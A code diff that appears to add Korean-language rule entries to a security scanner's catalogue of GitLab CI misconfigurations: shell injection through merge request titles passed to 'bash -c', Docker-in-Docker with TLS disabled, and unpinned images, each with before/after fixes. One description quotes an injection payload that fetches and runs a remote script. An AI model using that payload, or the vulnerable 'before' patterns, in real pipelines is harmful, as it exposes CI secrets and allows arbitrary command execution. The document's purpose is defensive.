+      description: '"script:"(또는 "before_script:"/"after_script:") 줄이 머지 리퀘스트 제목, 커밋 메시지, 브랜치 이름 같은 GitLab 사전 정의 변수와 함께 "eval" 또는 "sh -c"/"bash -c"를 사용합니다 — 이 값들은 외부 포크에서라도 머지 리퀘스트를 여는 누구나 작성할 수 있습니다. 값은 먼저 외부 셸에서 한 번 확장된 다음, 두 번째 셸이 다시 코드로 해석하는 문자열 안에 붙여넣어집니다: "$(curl malware.sh | sh)" 같은 제목은 해당 작업에서 사용 가능한 모든 시크릿에 접근하며 파이프라인에서 임의의 명령을 실행하게 됩니다.',
+      fix: {
+        before: `script:
+  - bash -c "deploy.sh $CI_MERGE_REQUEST_TITLE"`,
+        after: `script:
+  - deploy.sh "$CI_MERGE_REQUEST_TITLE"  # 명령어의 인자로 전달됨, 다시 해석될 "bash -c" 문자열 안에는 절대 넣지 않음`,
+      },
+    },
+    "gitlab-ci-privileged-dind-no-tls": {
+      title: 'GitLab CI 파이프라인의 Docker-in-Docker가 TLS 암호화를 비활성화한 채 실행되고 있습니다',
+      description: '이 작업은 "docker:dind" 서비스(파이프라인 내부에서 이미지를 빌드하는 데 필요한 Docker-in-Docker)를 사용하지만 "DOCKER_TLS_CERTDIR"을 빈 문자열로 설정하여 Docker 클라이언트와 dind 데몬 사이의 TLS 암호화를 완전히 비활성화합니다. TLS가 없으면 러너의 동일한 내부 네트워크에서 해당 포트에 접근할 수 있는 사람은 누구나 — 원래 이를 사용해야 할 작업으로 제한되는 대신 — 확장된 권한으로 실행되는 Docker 데몬을 제어할 수 있습니다.',
+      fix: {
+        before: `services:
+  - docker:dind
+variables:
+  DOCKER_TLS_CERTDIR: ""`,
+        after: `services:
+  - docker:dind
+variables:
+  DOCKER_TLS_CERTDIR: "/certs"  # Docker 클라이언트와 dind 데몬 사이의 TLS가 유지됨 — ""으로 설정하면 완전히 비활성화됨`,
+      },
+    },
+    "gitlab-ci-unpinned-image": {
+      title: 'GitLab CI 파이프라인의 Docker 이미지가 특정 버전으로 고정되어 있지 않습니다',
+      description: '파이프라인의 "image:"가 태그 없는 이미지(":latest"와 동일)를 가리키거나 명시적으로 ":latest"를 가리킵니다. 그 이미지를 유지 관리하는 사람은 저장소가 바뀌지 않아도 언제든 내용물을 교체할 수 있습니다 — 같은 파이프라인이 어느 날 갑자기 다른 코드를 실행하기 시작할 수 있으며, 이는 커밋이 아닌 태그로 참조된 GitHub Action과 개념적으로 동일한 공급망 위험입니다.',
+      fix: {
+        before: `image: node:latest`,
+        after: `image: node:20.11.1  # "latest" 대신 구체적인 태그(더 좋게는 다이제스트 "node@sha256:...")`,
+      },
+    },
 },
 };
